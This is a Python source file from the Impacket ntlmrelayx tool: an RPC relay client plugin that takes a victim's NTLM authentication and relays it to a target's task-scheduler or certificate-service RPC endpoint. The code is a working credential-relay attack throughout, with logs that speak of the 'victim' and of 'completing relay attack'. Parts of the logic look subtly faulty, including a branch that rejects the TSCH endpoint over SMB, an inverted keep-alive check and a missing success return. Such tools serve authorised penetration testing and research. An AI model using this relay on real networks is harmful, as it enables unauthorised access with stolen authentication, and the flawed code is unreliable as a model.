# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright Fortra, LLC and its affiliated companies 
#
# All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Authors:
#   Arseniy Sharoglazov <mohemiv@gmail.com> / Positive Technologies (https://www.ptsecurity.com/)
#   Based on @agsolino and @_dirkjan code
#

from struct import unpack

from impacket import LOG
from impacket.examples.ntlmrelayx.clients import ProtocolClient
from impacket.nt_errors import STATUS_SUCCESS, STATUS_ACCESS_DENIED
from impacket.ntlm import NTLMAuthChallenge
from impacket.spnego import SPNEGO_NegTokenResp

from impacket.dcerpc.v5 import transport, rpcrt, epm, tsch, icpr
from impacket.dcerpc.v5 import transport, rpcrt, epm, tsch
from impacket.dcerpc.v5.ndr import NDRCALL
from impacket.dcerpc.v5.rpcrt import DCERPC_v5, MSRPCBind, CtxItem, MSRPCHeader, SEC_TRAILER, MSRPCBindAck, \
    MSRPCRespHeader, MSRPCBindNak, DCERPCException, RPC_C_AUTHN_WINNT, RPC_C_AUTHN_LEVEL_CONNECT, \
    rpc_status_codes, rpc_provider_reason, RPC_C_AUTHN_LEVEL_NONE

PROTOCOL_CLIENT_CLASS = "RPCRelayClient"

class RPCRelayClientException(Exception):
    pass

class MYDCERPC_v5(DCERPC_v5):
    def __init__(self, transport):
        DCERPC_v5.__init__(self, transport)

    def sendBindType1(self, iface_uuid, auth_data):
        bind = MSRPCBind()

        item = CtxItem()
        item['AbstractSyntax'] = iface_uuid
        item['TransferSyntax'] = self.transfer_syntax
        item['ContextID'] = 0
        item['TransItems'] = 1
        bind.addCtxItem(item)

        packet = MSRPCHeader()
        packet['type'] = rpcrt.MSRPC_BIND
        packet['pduData'] = bind.getData()
        packet['call_id'] = 0

        sec_trailer = SEC_TRAILER()
        sec_trailer['auth_type']   = RPC_C_AUTHN_WINNT
        sec_trailer['auth_level']  = RPC_C_AUTHN_LEVEL_CONNECT
        sec_trailer['auth_ctx_id'] = 79231

        pad = (4 - (len(packet.get_packet()) % 4)) % 4
        if pad != 0:
           packet['pduData'] += b'\xFF' * pad
           sec_trailer['auth_pad_len'] = pad

        packet['sec_trailer'] = sec_trailer
        packet['auth_data'] = auth_data

        self._transport.send(packet.get_packet())

        s = self._transport.recv()

        if s != 0:
            resp = MSRPCHeader(s)
        else:
            return 0 #mmm why not None?

        if resp['type'] == rpcrt.MSRPC_BINDACK or resp['type'] == rpcrt.MSRPC_ALTERCTX_R:
            bindResp = MSRPCBindAck(resp.getData())
        elif resp['type'] == rpcrt.MSRPC_BINDNAK or resp['type'] == rpcrt.MSRPC_FAULT:
            if resp['type'] == rpcrt.MSRPC_FAULT:
                resp = MSRPCRespHeader(resp.getData())
                status_code = unpack('<L', resp['pduData'][:4])[0]
            else:
                resp = MSRPCBindNak(resp['pduData'])
                status_code = resp['RejectedReason']
            if status_code in rpc_status_codes:
                raise DCERPCException(error_code = status_code)
            elif status_code in rpc_provider_reason:
                raise DCERPCException("Bind context rejected: %s" % rpc_provider_reason[status_code])
            else:
                raise DCERPCException('Unknown DCE RPC fault status code: %.8x' % status_code)
        else:
            raise DCERPCException('Unknown DCE RPC packet type received: %d' % resp['type'])

        self.set_max_tfrag(bindResp['max_rfrag'])

        return bindResp

    def sendBindType3(self, auth_data):
        sec_trailer = SEC_TRAILER()
        sec_trailer['auth_type']   = RPC_C_AUTHN_WINNT
        sec_trailer['auth_level']  = RPC_C_AUTHN_LEVEL_CONNECT
        sec_trailer['auth_ctx_id'] = 79231

        auth3 = MSRPCHeader()
        auth3['type'] = rpcrt.MSRPC_AUTH3

        # pad (4 bytes): Can be set to any arbitrary value when set and MUST be
        # ignored on receipt. The pad field MUST be immediately followed by a
        # sec_trailer structure whose layout, location, and alignment are as
        # specified in section 2.2.2.11
        auth3['pduData'] = b'    '
        auth3['sec_trailer'] = sec_trailer
        auth3['auth_data'] = auth_data
        auth3['call_id'] = 0

        self._transport.send(auth3.get_packet(), forceWriteAndx = 1)

class DummyOp(NDRCALL):
    opnum = 255
    structure = (
    )

class RPCRelayClient(ProtocolClient):
    PLUGIN_NAME = "RPC"

    def __init__(self, serverConfig, target, targetPort=None, extendedSecurity=True):
        LOG.info("RPC Relay: Creating RPC client for target %s" % target.netloc)
        ProtocolClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)

        # TODO: support relaying RPC to different endpoints (e.g. DCOM, SpoolSS)
        # TODO: create a single LOG interface for ntlmrelayx to provide a user info which message/error to which thread belongs
        self.endpoint = serverConfig.rpc_mode

        if self.endpoint == "TSCH":
            self.endpoint_uuid = tsch.MSRPC_UUID_TSCHS
        elif self.endpoint == "ICPR":
            self.endpoint_uuid = icpr.MSRPC_UUID_ICPR
        else:
            raise NotImplementedError("Not implemented!")

        if self.serverConfig.rpc_use_smb:
            if self.endpoint == "TSCH":
                self.stringbinding = "ncacn_np:%s[\\pipe\\atsvc]" % target.netloc
            if self.endpoint == "ICPR":
                self.stringbinding = "ncacn_np:%s[\\pipe\\cert]" % target.netloc
            else:
                raise NotImplementedError("Not implemented!")
        else:
            LOG.debug("Connecting to ncacn_ip_tcp:%s[135] to determine %s stringbinding" % (target.netloc, self.endpoint))
            self.stringbinding = epm.hept_map(target.netloc, self.endpoint_uuid, protocol='ncacn_ip_tcp')

        LOG.debug("%s stringbinding is %s" % (self.endpoint, self.stringbinding))
        LOG.info("RPC Relay: RPC client constructor completed successfully")

    def initConnection(self):
        LOG.info("RPC Relay: initConnection called for target %s" % self.stringbinding)
        
        # Just set up the transport but don't connect yet - that happens in sendNegotiate
        rpctransport = transport.DCERPCTransportFactory(self.stringbinding)

        if self.serverConfig.rpc_use_smb:
            LOG.debug("RPC Relay: Setting up SMB transport credentials")
            rpctransport.set_credentials(self.serverConfig.smbuser, self.serverConfig.smbpass, self.serverConfig.smbdomain, \
                self.serverConfig.smblmhash, self.serverConfig.smbnthash)
            rpctransport.set_dport(self.serverConfig.rpc_smb_port)
            
            # Enable Kerberos if requested
            if self.serverConfig.kerberos:
                LOG.debug("RPC Relay: Enabling Kerberos for SMB transport")
                rpctransport.set_kerberos(True)
                
                # Patch the SMBTransport connect method to force useCache=False
                original_connect = rpctransport.connect
                def patched_connect():
                    LOG.debug("RPC Relay: Patched connect method called")
                    # Check if we have a smb connection already setup
                    if rpctransport._SMBTransport__smb_connection == 0:
                        LOG.debug("RPC Relay: Setting up SMB connection")
                        rpctransport.setup_smb_connection()
                        if rpctransport._doKerberos is False:
                            LOG.debug("RPC Relay: Using NTLM authentication")
                            rpctransport._SMBTransport__smb_connection.login(rpctransport._username, rpctransport._password, rpctransport._domain, rpctransport._lmhash, rpctransport._nthash)
                        else:
                            # Call kerberosLogin with useCache=False to force command-line credentials
                            LOG.info("Forcing useCache=False for Kerberos authentication")
                            rpctransport._SMBTransport__smb_connection.kerberosLogin(
                                rpctransport._username, rpctransport._password, rpctransport._domain, 
                                rpctransport._lmhash, rpctransport._nthash, rpctransport._aesKey, 
                                kdcHost=rpctransport._kdcHost, TGT=rpctransport._TGT, TGS=rpctransport._TGS, 
                                useCache=False
                            )
                    LOG.debug("RPC Relay: Connecting to IPC$ tree")
                    rpctransport._SMBTransport__tid = rpctransport._SMBTransport__smb_connection.connectTree('IPC$')
                    LOG.debug("RPC Relay: Opening pipe %s" % rpctransport._SMBTransport__filename)
                    rpctransport._SMBTransport__handle = rpctransport._SMBTransport__smb_connection.openFile(rpctransport._SMBTransport__tid, rpctransport._SMBTransport__filename)
                    rpctransport._SMBTransport__socket = rpctransport._SMBTransport__smb_connection.getSMBServer().get_socket()
                    LOG.debug("RPC Relay: SMB transport setup complete")
                    return 1
                
                rpctransport.connect = patched_connect

        LOG.debug("RPC Relay: Creating RPC session (not connecting yet)")
        self.session = MYDCERPC_v5(rpctransport)
        self.session.set_auth_level(RPC_C_AUTHN_LEVEL_CONNECT)
        
        # Store the transport for later use
        self.rpctransport = rpctransport
        
        LOG.info("RPC Relay: initConnection completed - ready for relay")
        return True

    def sendNegotiate(self, auth_data):
        LOG.info("RPC Relay: sendNegotiate called - victim sending NTLM Type 1, relay starting!")
        
        # Now is the time to establish the connection to the target
        if self.serverConfig.rpc_use_smb:
            LOG.info("Authenticating to smb://%s:%d with creds provided in cmdline" % (self.target.netloc, self.serverConfig.rpc_smb_port))
            if self.serverConfig.kerberos:
                LOG.info("Using Kerberos authentication for SMB")
        
        # Connect the session (this will trigger the Kerberos authentication if configured)
        self.session.connect()

        if self.serverConfig.rpc_use_smb:
            self.session.set_auth_level(RPC_C_AUTHN_LEVEL_NONE)
            LOG.info("Authentication to smb://%s:%d succeeded" % (self.target.netloc, self.serverConfig.rpc_smb_port))
        else:
            self.session.set_auth_level(RPC_C_AUTHN_LEVEL_CONNECT)
        
        # Final connection setup
        self.session.connect()
        
        # Now send the victim's NTLM Type 1 message to the target
        LOG.debug("RPC Relay: Sending victim's NTLM Type 1 to target %s" % self.stringbinding)
        bindResp = self.session.sendBindType1(self.endpoint_uuid, auth_data)

        challenge = NTLMAuthChallenge()
        challenge.fromString(bindResp['auth_data'])

        LOG.debug("RPC Relay: Received NTLM challenge from target, relaying back to victim")
        
        return challenge

    def sendAuth(self, authenticateMessageBlob, serverChallenge=None):
        LOG.info("RPC Relay: sendAuth called - victim sending NTLM Type 3, completing relay attack!")
        
        if unpack('B', authenticateMessageBlob[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
            respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)
            auth_data = respToken2['ResponseToken']
        else:
            auth_data = authenticateMessageBlob

        LOG.debug("RPC Relay: Sending victim's NTLM Type 3 to target %s" % self.stringbinding)
        self.session.sendBindType3(auth_data)

        LOG.debug("RPC Relay: Testing relay success with dummy RPC call")
        try:
            req = DummyOp()
            self.session.request(req)
            LOG.debug("RPC Relay: Relay attack completed successfully!")
        except DCERPCException as e:
            if 'nca_s_op_rng_error' in str(e) or 'RPC_E_INVALID_HEADER' in str(e):
                LOG.debug("RPC Relay: Relay completed successfully (expected error): %s" % str(e))
                return None, STATUS_SUCCESS
            elif 'rpc_s_access_denied' in str(e):
                LOG.debug("RPC Relay: Access denied - relay failed: %s" % str(e))
                return None, STATUS_ACCESS_DENIED
            else:
                LOG.info("Unexpected rpc code received from %s: %s" % (self.stringbinding, str(e)))
                return None, STATUS_ACCESS_DENIED

    def killConnection(self):
        if self.session is not None:
            self.session.get_rpc_transport().disconnect()
            self.session = None

    def keepAlive(self):
        try:
            req = DummyOp()
            self.session.request(req)
        except DCERPCException as e:
            if 'nca_s_op_rng_error' not in str(e) or 'RPC_E_INVALID_HEADER' not in str(e):
                raise
